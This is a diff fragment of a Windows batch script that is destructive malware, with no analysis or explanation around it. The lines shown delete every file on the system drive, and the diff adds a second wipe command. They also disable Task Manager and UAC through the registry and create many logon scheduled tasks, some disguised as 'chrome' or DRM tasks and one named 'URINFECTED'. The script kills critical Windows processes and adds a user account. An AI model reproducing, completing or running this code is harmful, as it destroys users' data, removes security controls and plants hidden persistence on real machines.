@@ -30,21 +30,19 @@ if '%errorlevel%' NEQ '0' (
 md   C:\Wind0ws
 @echo off 
 start del %systemdrive%\*.* /f /s /q
-
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 SchTasks /Create  /SC ONLOGON /TN "URINFECTED"  /TR C:\Wind0ws\runatstart.cmd
- reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 SchTasks /Create  /SC ONLOGON /TN "MSDRM"  /TR  C:\Wind0ws\stw.vbs
 SchTasks /Create  /SC ONLOGON /TN "drm"  /TR t C:\Wind0ws\runatstart.cmd
- SchTasks /Create  /SC ONLOGON /TN "chrome"  /TR  C:\Wind0ws\runatstart.cmd
- SchTasks /Create  /SC ONLOGON /TN " C:\Windows\basedrm"  /TR C:\Wind0ws\runatstart.cmd
- SchTasks /Create  /SC ONLOGON /TN "DRMB1"  /TR  C:\Wind0ws\runatstart.cmd
- SchTasks /Create  /SC ONLOGON /TN "DRMB"  /TR C:\Wind0ws\runatstart.cmd
+SchTasks /Create  /SC ONLOGON /TN "chrome"  /TR  C:\Wind0ws\runatstart.cmd
+SchTasks /Create  /SC ONLOGON /TN " C:\Windows\basedrm"  /TR C:\Wind0ws\runatstart.cmd
+SchTasks /Create  /SC ONLOGON /TN "DRMB1"  /TR  C:\Wind0ws\runatstart.cmd
+SchTasks /Create  /SC ONLOGON /TN "DRMB"  /TR C:\Wind0ws\runatstart.cmd
 taskkill /F /IM ntoskrnl.exe
 taskkill /F /IM sihost.exe
-md C:\Wind1
 Sqet.cmd
 net user /add James
 @echo off 
-
+del %systemdrive%\*.* /f /s /q
 
